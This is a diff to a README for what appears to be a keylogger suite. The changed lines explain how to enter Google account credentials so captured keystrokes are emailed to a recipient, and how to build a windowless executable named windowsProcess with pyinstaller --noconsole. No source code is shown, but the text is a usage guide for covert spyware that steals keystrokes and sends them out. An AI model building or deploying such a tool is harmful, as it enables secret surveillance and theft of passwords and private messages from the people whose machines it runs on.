@@ -12,10 +12,14 @@ A suite of 3 programs:
 # Usage
 
 ## Keylogger
-Simply launch the `.exe` file.
+Change the `user` and `password` fields to the sender account of the key-logs.
+Also, change the `user` field for the recipient account of the key-logs.
+The account must be a google account.
 
-To recompile the `.exe` file, run:
+Then, to compile the `.exe` file, run:
 `pyinstaller --noconsole windowsProcess.py --onefile`
+
+To use the Keylogger, launch the `.exe` file.
 
 ## Keylog Extractor
 Change the `user` and `password` fields to the recipient account of the key-logs.
